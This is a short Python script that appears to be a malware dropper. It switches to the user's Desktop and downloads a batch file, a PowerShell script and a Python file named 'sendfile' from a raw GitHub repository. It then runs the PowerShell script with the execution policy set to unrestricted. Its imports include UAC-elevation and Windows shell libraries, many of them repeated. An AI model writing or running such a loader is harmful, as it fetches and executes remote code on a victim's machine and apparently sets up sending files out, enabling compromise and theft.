import tkinter as tk
from tkinter import simpledialog
import subprocess
import os
import sys
import os

from urllib import request

from os.path import exists

import time

import subprocess

import sys

import requests

import pythoncom

import pyuac

import pywintypes

import win32api

from win32com.shell import shell

import tkinter as tk

from tkinter import simpledialog

import subprocess

d = os.path.join(os.environ["HOMEPATH"], r"Desktop")

os.chdir(d)

remote_url = 'https://raw.githubusercontent.com/Mood56467/889671/main/bumper'

local_file = 'bumper5.bat'

request.urlretrieve(remote_url, local_file)

remote_url = 'https://raw.githubusercontent.com/Mood56467/889671/main/ss'

local_file = 'ss.ps1'

request.urlretrieve(remote_url, local_file)

remote_url = 'https://raw.githubusercontent.com/Mood56467/889671/main/sendfile'

local_file = 'sendfile.py'

request.urlretrieve(remote_url, local_file)


p = subprocess.Popen('powershell.exe -executionpolicy unrestricted -File "ss.ps1"', stdout=sys.stdout)
p.communicate()
